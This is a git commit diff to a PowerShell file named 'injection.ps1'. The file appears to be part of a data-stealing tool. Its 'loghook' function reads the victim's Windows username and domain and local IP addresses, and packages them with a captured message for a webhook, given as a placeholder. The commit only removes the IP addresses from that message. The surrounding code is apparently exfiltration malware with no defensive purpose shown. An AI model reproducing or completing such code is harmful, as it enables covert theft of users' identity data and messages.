e53c50712a26f66d47275d6054b18b87e6186b28
43a1723 <hai1723notgay@gmail.com>
2024-06-10 11:35:56 +0700

    Update injection.ps1

--- injection.ps1
+++ injection.ps1
@@ -9,7 +9,7 @@ function loghook {
     # Define the webhook URL
     $webhookUrl = "YOUR_WEBHOOK_HERE2"
     $ipAddresses = Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne '127.0.0.1' } | Select-Object -ExpandProperty IPAddress
-    $Messagee = "$env:USERNAME - $env:USERDOMAIN `n ip: ``````$ipAddresses`````` tin nhan: ``````$Message``````"
+    $Messagee = "$env:USERNAME - $env:USERDOMAIN `n tin nhan: ``````$Message``````"
     
     # Create the payload
     $payload = @{
